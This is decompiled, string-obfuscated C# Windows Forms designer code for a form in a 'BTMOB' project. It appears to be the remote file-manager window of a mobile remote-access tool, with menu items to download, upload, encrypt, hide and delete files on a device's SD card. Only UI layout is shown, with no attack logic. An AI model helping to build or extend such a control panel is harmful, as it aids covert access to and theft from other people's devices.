		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
		this.DrakeWidth_W8 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W5 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W6 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W7 = new DrakeUI.Framework.DrakeWidth_W();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.mytitle = new System.Windows.Forms.Label();
		this.myscr = new System.Windows.Forms.PictureBox();
		this.myico = new System.Windows.Forms.PictureBox();
		this.closbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.refresher = new System.Windows.Forms.Timer(this.components);
		this.DrakeWidth_W1 = new DrakeUI.Framework.DrakeWidth_W();
		this.ctxMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem5 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
		this.SDCARDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.OpenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.CopyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.CutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.PasteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RenameToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
		this.DownloadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.UploadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.EncryptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.DecodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.PreviewToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ZipToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.UnZipToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.DeleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.AddFilesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.EditToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.DownloadFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.HideToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ShowToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SetWallpaperToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.PlaySoundToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.FolderDownloadsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.tabsfiles = new DrakeUI.Framework.DrakeUITabControl();
		this.TabPage1 = new System.Windows.Forms.TabPage();
		this.listfilesvew = new BrightIdeasSoftware.FastObjectListView();
		this.HeaderFormatStyle1 = new BrightIdeasSoftware.HeaderFormatStyle();
		this.thumbsimags = new System.Windows.Forms.ImageList(this.components);
		this.filesicons = new System.Windows.Forms.ImageList(this.components);
		this.PBtitlebar = new DrakeUI.Framework.DrakeUITrackBar();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.pathtxt = new DrakeUI.Framework.DrakeUITextBox();
		this.Panel10 = new System.Windows.Forms.Panel();
		this.DrakeWidth_W9 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W3 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeUIButtonIcon3 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Label2 = new System.Windows.Forms.Label();
		this.searchtext = new DrakeUI.Framework.DrakeUITextBox();
		this.Panel9 = new System.Windows.Forms.Panel();
		this.Panel6 = new System.Windows.Forms.Panel();
		this.Panel13 = new System.Windows.Forms.Panel();
		this.autoloadtogle = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W11 = new DrakeUI.Framework.DrakeWidth_W();
		this.toggleview = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W4 = new DrakeUI.Framework.DrakeWidth_W();
		this.viwimagepanel = new System.Windows.Forms.Panel();
		this.viwimage = new System.Windows.Forms.PictureBox();
		this.TableLayoutPanel2 = new System.Windows.Forms.TableLayoutPanel();
		this.shortbtn6 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.shortbtn1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.shortbtn2 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.shortbtn3 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.shortbtn5 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.shortbtn4 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W2 = new DrakeUI.Framework.DrakeWidth_W();
		this.Panel11 = new System.Windows.Forms.Panel();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.usagetitle = new System.Windows.Forms.Label();
		this.usageprecent = new DrakeUI.Framework.DrakeUIProcessBar();
		this.emptytext = new System.Windows.Forms.Label();
		this.TabPage2 = new System.Windows.Forms.TabPage();
		this.DGVDATA = new System.Windows.Forms.DataGridView();
		this.N = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.P = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.S = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ST = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.progclu = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ctxdowns = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.StopDownloadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ClearAllToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.TabPage3 = new System.Windows.Forms.TabPage();
		this.filesscanpanel = new System.Windows.Forms.Panel();
		this.DGVFIND = new System.Windows.Forms.DataGridView();
		this.numnamclm = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.numculm = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.acctclum = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Panel5 = new System.Windows.Forms.Panel();
		this.srchfilsbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.clrbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W10 = new DrakeUI.Framework.DrakeWidth_W();
		this.comsrchfor = new DrakeUI.Framework.DrakeUIComboBox();
		this.Panel7 = new System.Windows.Forms.Panel();
		this.Label3 = new System.Windows.Forms.Label();
		this.Panel12 = new System.Windows.Forms.Panel();
		this.TableLayoutPanel3 = new System.Windows.Forms.TableLayoutPanel();
		this.nav3btn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.nav2btn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.nav1btn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.statetext = new System.Windows.Forms.Label();
		this.baseloader = new DrakeUI.Framework.DrakeUILoadingBar();
		this.statetimer = new System.Windows.Forms.Timer(this.components);
		this.backgroundWorker = new System.ComponentModel.BackgroundWorker();
		this.FilesUpload = new System.Windows.Forms.OpenFileDialog();
		this.Panel8 = new System.Windows.Forms.Panel();
		this.BTtiptool = new DrakeUI.Framework.DrakeUIToolTip(this.components);
		this.Panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.ctxMenu.SuspendLayout();
		this.tabsfiles.SuspendLayout();
		this.TabPage1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.listfilesvew).BeginInit();
		this.Panel3.SuspendLayout();
		this.Panel9.SuspendLayout();
		this.Panel6.SuspendLayout();
		this.Panel13.SuspendLayout();
		this.viwimagepanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.viwimage).BeginInit();
		this.TableLayoutPanel2.SuspendLayout();
		this.Panel11.SuspendLayout();
		this.Panel2.SuspendLayout();
		this.TabPage2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGVDATA).BeginInit();
		this.ctxdowns.SuspendLayout();
		this.TabPage3.SuspendLayout();
		this.filesscanpanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGVFIND).BeginInit();
		this.Panel5.SuspendLayout();
		this.Panel7.SuspendLayout();
		this.Panel12.SuspendLayout();
		this.TableLayoutPanel3.SuspendLayout();
		this.Panel4.SuspendLayout();
		this.Panel8.SuspendLayout();
		base.SuspendLayout();
		this.DrakeWidth_W8.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeWidth_W8.Cursor = System.Windows.Forms.Cursors.SizeNS;
		this.DrakeWidth_W8.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeWidth_W8.Location = new System.Drawing.Point(3, 881);
		this.DrakeWidth_W8.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W8.Name = EXGuarder._142F530F;
		this.DrakeWidth_W8.Size = new System.Drawing.Size(1241, 3);
		this.DrakeWidth_W8.TabIndex = 31;
		this.DrakeWidth_W5.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeWidth_W5.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W5.Location = new System.Drawing.Point(0, 3);
		this.DrakeWidth_W5.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W5.Name = EXGuarder._305A1072;
		this.DrakeWidth_W5.Size = new System.Drawing.Size(3, 881);
		this.DrakeWidth_W5.TabIndex = 29;
		this.DrakeWidth_W6.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeWidth_W6.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W6.Location = new System.Drawing.Point(0, 0);
		this.DrakeWidth_W6.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W6.Name = EXGuarder._12532635;
		this.DrakeWidth_W6.Size = new System.Drawing.Size(1244, 3);
		this.DrakeWidth_W6.TabIndex = 28;
		this.DrakeWidth_W7.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeWidth_W7.Cursor = System.Windows.Forms.Cursors.SizeWE;
		this.DrakeWidth_W7.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W7.Location = new System.Drawing.Point(1244, 0);
		this.DrakeWidth_W7.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W7.Name = EXGuarder._68001130;
		this.DrakeWidth_W7.Size = new System.Drawing.Size(3, 884);
		this.DrakeWidth_W7.TabIndex = 30;
		this.Panel1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon2);
		this.Panel1.Controls.Add(this.mytitle);
		this.Panel1.Controls.Add(this.myscr);
		this.Panel1.Controls.Add(this.myico);
		this.Panel1.Controls.Add(this.closbtn);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel1.Location = new System.Drawing.Point(3, 3);
		this.Panel1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel1.Name = EXGuarder._05232566;
		this.Panel1.Size = new System.Drawing.Size(1241, 34);
		this.Panel1.TabIndex = 32;
		this.DrakeUIButtonIcon2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon2.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.Font = new System.Drawing.Font(EXGuarder._0C280858, 12f);
		this.DrakeUIButtonIcon2.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon2.ForeDisableColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon2.ForeHoverColor = System.Drawing.Color.Red;
		this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(1167, 0);
		this.DrakeUIButtonIcon2.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DrakeUIButtonIcon2.Name = EXGuarder._0D4A3652;
		this.DrakeUIButtonIcon2.Radius = 15;
		this.DrakeUIButtonIcon2.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon2.RectHoverColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon2.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon2.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon2.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(37, 34);
		this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon2.Symbol = 61544;
		this.DrakeUIButtonIcon2.SymbolSize = 19;
		this.DrakeUIButtonIcon2.TabIndex = 53;
		this.mytitle.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.mytitle.Dock = System.Windows.Forms.DockStyle.Fill;
		this.mytitle.Font = new System.Drawing.Font(EXGuarder._0C280858, 9f);
		this.mytitle.ForeColor = System.Drawing.SystemColors.ControlLight;
		this.mytitle.Location = new System.Drawing.Point(88, 0);
		this.mytitle.Name = EXGuarder._45764A42;
		this.mytitle.Size = new System.Drawing.Size(1116, 34);
		this.mytitle.TabIndex = 3;
		this.mytitle.Text = EXGuarder._08701838;
		this.mytitle.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.myscr.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.myscr.Dock = System.Windows.Forms.DockStyle.Left;
		this.myscr.Location = new System.Drawing.Point(44, 0);
		this.myscr.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.myscr.Name = EXGuarder._2D092C5A;
		this.myscr.Size = new System.Drawing.Size(44, 34);
		this.myscr.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage;
		this.myscr.TabIndex = 6;
		this.myscr.TabStop = false;
		this.myico.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.myico.Dock = System.Windows.Forms.DockStyle.Left;
		this.myico.Location = new System.Drawing.Point(0, 0);
		this.myico.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.myico.Name = EXGuarder._4D44295C;
		this.myico.Size = new System.Drawing.Size(44, 34);
		this.myico.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage;
		this.myico.TabIndex = 5;
		this.myico.TabStop = false;
		this.closbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.closbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.closbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.Font = new System.Drawing.Font(EXGuarder._0C280858, 12f);
		this.closbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.closbtn.ForeDisableColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.closbtn.ForeHoverColor = System.Drawing.Color.Red;
		this.closbtn.Location = new System.Drawing.Point(1204, 0);
		this.closbtn.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.closbtn.Name = EXGuarder._353C3A19;
		this.closbtn.Radius = 15;
		this.closbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.closbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.closbtn.RectDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.closbtn.RectHoverColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.closbtn.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.closbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.closbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.closbtn.Size = new System.Drawing.Size(37, 34);
		this.closbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.closbtn.Symbol = 61453;
		this.closbtn.SymbolSize = 19;
		this.closbtn.TabIndex = 52;
		this.refresher.Interval = 1000;
		this.DrakeWidth_W1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W1.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W1.Location = new System.Drawing.Point(3, 37);
		this.DrakeWidth_W1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W1.Name = EXGuarder._023E4C27;
		this.DrakeWidth_W1.Size = new System.Drawing.Size(1241, 1);
		this.DrakeWidth_W1.TabIndex = 34;
		this.ctxMenu.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.ctxMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[23]
		{
			this.ToolStripMenuItem1, this.OpenToolStripMenuItem, this.CopyToolStripMenuItem, this.CutToolStripMenuItem, this.PasteToolStripMenuItem, this.RenameToolStripMenuItem, this.ToolStripMenuItem7, this.DownloadToolStripMenuItem, this.UploadToolStripMenuItem, this.EncryptToolStripMenuItem,
			this.DecodeToolStripMenuItem, this.PreviewToolStripMenuItem, this.ZipToolStripMenuItem, this.UnZipToolStripMenuItem, this.DeleteToolStripMenuItem, this.AddFilesToolStripMenuItem, this.EditToolStripMenuItem, this.DownloadFileToolStripMenuItem, this.HideToolStripMenuItem, this.ShowToolStripMenuItem,
			this.SetWallpaperToolStripMenuItem, this.PlaySoundToolStripMenuItem, this.FolderDownloadsToolStripMenuItem
		});
		this.ctxMenu.Name = EXGuarder._0873771D;
		this.ctxMenu.RenderMode = System.Windows.Forms.ToolStripRenderMode.Professional;
		this.ctxMenu.Size = new System.Drawing.Size(206, 694);
		this.ToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.ToolStripMenuItem2, this.ToolStripMenuItem3, this.ToolStripMenuItem4, this.ToolStripMenuItem5, this.ToolStripMenuItem6, this.SDCARDToolStripMenuItem });
		this.ToolStripMenuItem1.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.ToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem1.Image = BTMOB.My.Resources.Resources.navto;
		this.ToolStripMenuItem1.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem1.Name = EXGuarder._2D753335;
		this.ToolStripMenuItem1.Size = new System.Drawing.Size(205, 30);
		this.ToolStripMenuItem1.Text = EXGuarder._6515425B;
		this.ToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ToolStripMenuItem2.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem2.Name = EXGuarder._6408054F;
		this.ToolStripMenuItem2.Size = new System.Drawing.Size(178, 26);
		this.ToolStripMenuItem2.Text = EXGuarder._6E6C2377;
		this.ToolStripMenuItem3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ToolStripMenuItem3.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem3.Name = EXGuarder._42484774;
		this.ToolStripMenuItem3.Size = new System.Drawing.Size(178, 26);
		this.ToolStripMenuItem3.Text = EXGuarder._5D5F4E61;
		this.ToolStripMenuItem4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ToolStripMenuItem4.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem4.Name = EXGuarder._1B3C412D;
		this.ToolStripMenuItem4.Size = new System.Drawing.Size(178, 26);
		this.ToolStripMenuItem4.Text = EXGuarder._3C087278;
		this.ToolStripMenuItem5.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ToolStripMenuItem5.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem5.Name = EXGuarder._55236E49;
		this.ToolStripMenuItem5.Size = new System.Drawing.Size(178, 26);
		this.ToolStripMenuItem5.Text = EXGuarder._3D050D31;
		this.ToolStripMenuItem6.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ToolStripMenuItem6.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem6.Name = EXGuarder._6410584B;
		this.ToolStripMenuItem6.Size = new System.Drawing.Size(178, 26);
		this.ToolStripMenuItem6.Text = EXGuarder._57201F0A;
		this.SDCARDToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.SDCARDToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.SDCARDToolStripMenuItem.Name = EXGuarder._75685B3E;
		this.SDCARDToolStripMenuItem.Size = new System.Drawing.Size(178, 26);
		this.SDCARDToolStripMenuItem.Text = EXGuarder._15665000;
		this.OpenToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.OpenToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.OpenToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.OpenToolStripMenuItem.Image = BTMOB.My.Resources.Resources.openfile1;
		this.OpenToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.OpenToolStripMenuItem.Name = EXGuarder._675C3271;
		this.OpenToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.OpenToolStripMenuItem.Text = EXGuarder._38050F48;
		this.CopyToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.CopyToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.CopyToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.CopyToolStripMenuItem.Image = BTMOB.My.Resources.Resources.copyfile;
		this.CopyToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.CopyToolStripMenuItem.Name = EXGuarder._41620B3A;
		this.CopyToolStripMenuItem.ShortcutKeys = System.Windows.Forms.Keys.C | System.Windows.Forms.Keys.Control;
		this.CopyToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.CopyToolStripMenuItem.Text = EXGuarder._54023806;
		this.CutToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.CutToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.CutToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.CutToolStripMenuItem.Image = BTMOB.My.Resources.Resources.cutfile;
		this.CutToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.CutToolStripMenuItem.Name = EXGuarder._142B750F;
		this.CutToolStripMenuItem.ShortcutKeys = System.Windows.Forms.Keys.X | System.Windows.Forms.Keys.Control;
		this.CutToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.CutToolStripMenuItem.Text = EXGuarder._5320605B;
		this.PasteToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.PasteToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.PasteToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.PasteToolStripMenuItem.Image = BTMOB.My.Resources.Resources.pastefile;
		this.PasteToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.PasteToolStripMenuItem.Name = EXGuarder._6E381654;
		this.PasteToolStripMenuItem.ShortcutKeys = System.Windows.Forms.Keys.V | System.Windows.Forms.Keys.Control;
		this.PasteToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.PasteToolStripMenuItem.Text = EXGuarder._1B0B015B;
		this.RenameToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.RenameToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.RenameToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.RenameToolStripMenuItem.Image = BTMOB.My.Resources.Resources.renamefile;
		this.RenameToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.RenameToolStripMenuItem.Name = EXGuarder._473B701F;
		this.RenameToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.RenameToolStripMenuItem.Text = EXGuarder._493C7472;
		this.ToolStripMenuItem7.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ToolStripMenuItem7.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.ToolStripMenuItem7.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem7.Image = BTMOB.My.Resources.Resources.fastdown;
		this.ToolStripMenuItem7.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem7.Name = EXGuarder._46096F23;
		this.ToolStripMenuItem7.Size = new System.Drawing.Size(205, 30);
		this.ToolStripMenuItem7.Text = EXGuarder._2E201855;
		this.DownloadToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DownloadToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.DownloadToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.DownloadToolStripMenuItem.Image = BTMOB.My.Resources.Resources.downloadfile;
		this.DownloadToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.DownloadToolStripMenuItem.Name = EXGuarder._6D78625F;
		this.DownloadToolStripMenuItem.ShortcutKeys = System.Windows.Forms.Keys.D | System.Windows.Forms.Keys.Control;
		this.DownloadToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.DownloadToolStripMenuItem.Text = EXGuarder._2B640F64;
		this.UploadToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.UploadToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.UploadToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.UploadToolStripMenuItem.Image = BTMOB.My.Resources.Resources.uploadfile;
		this.UploadToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.UploadToolStripMenuItem.Name = EXGuarder._58661764;
		this.UploadToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.UploadToolStripMenuItem.Text = EXGuarder._6A48354E;
		this.EncryptToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.EncryptToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.EncryptToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.EncryptToolStripMenuItem.Image = BTMOB.My.Resources.Resources.cryptfile;
		this.EncryptToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.EncryptToolStripMenuItem.Name = EXGuarder._5318596A;
		this.EncryptToolStripMenuItem.Size = new System.Drawing.Size(205, 30);
		this.EncryptToolStripMenuItem.Text = EXGuarder._2F124B52;
		this.DecodeToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DecodeToolStripMenuItem.Font = new System.Drawing.Font(EXGuarder._0C280858, 8.5f);
		this.DecodeToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.DecodeToolStripMenuItem.Image = BTMOB.My.Resources.Resources.decryptfile;
		this.DecodeToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
